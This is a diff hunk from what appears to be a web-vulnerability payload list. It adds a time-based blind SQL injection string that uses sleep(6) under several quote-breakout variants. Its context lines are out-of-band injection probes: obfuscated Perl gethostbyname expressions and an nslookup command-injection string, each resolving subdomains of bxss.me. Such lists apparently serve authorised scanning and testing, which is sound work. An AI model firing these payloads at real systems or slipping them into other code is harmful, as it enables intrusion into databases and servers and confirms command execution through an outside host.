@@ -3106,3 +3106,4 @@ Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) 
 geth(ostbyname(lc('hituq'.'dktmcwyrebf03.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(103).chr(65).chr(108).chr(89))
 "".gethostbyname(lc(""hitki"".""jvnzcvveaeced.bxss.me."").""A"".chr(67).chr(hex(""58"")).chr(100).chr(68).chr(122).chr(65)."")
 &nslookup -q=cname hitocqnjqxkbr194c1.bxss.me&'""`0&nslookup -q=cname hitocqnjqxkbr194c1.bxss.me&`'
+(select(0from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'""+(select(0)from(select(sleep(6)))v)+""*/)
